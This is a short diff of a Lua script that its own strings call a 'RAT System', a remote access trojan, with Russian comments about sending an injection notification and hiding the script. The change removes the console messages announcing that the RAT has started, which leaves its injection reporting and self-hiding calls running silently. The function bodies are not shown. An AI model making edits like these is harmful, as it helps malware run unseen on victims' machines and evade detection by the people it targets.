@@ -668,7 +668,6 @@ end
 
 -- Инициализация с безопасной проверкой
 local function initialize()
-    print("🚀 RAT System: Инициализация...")
     
     -- Отправляем уведомление об инжекте
     pcall(sendInjectNotification)
@@ -679,7 +678,6 @@ local function initialize()
     -- Пытаемся скрыть скрипт
     pcall(hideScript)
     
-    print("✅ RAT System: Инициализация завершена")
 end
 
 -- Главный цикл
@@ -715,5 +713,3 @@ end
 -- Запуск системы
 pcall(initialize)
 pcall(mainLoop)
-
-print("🎯 RAT System: Запущен и работает")
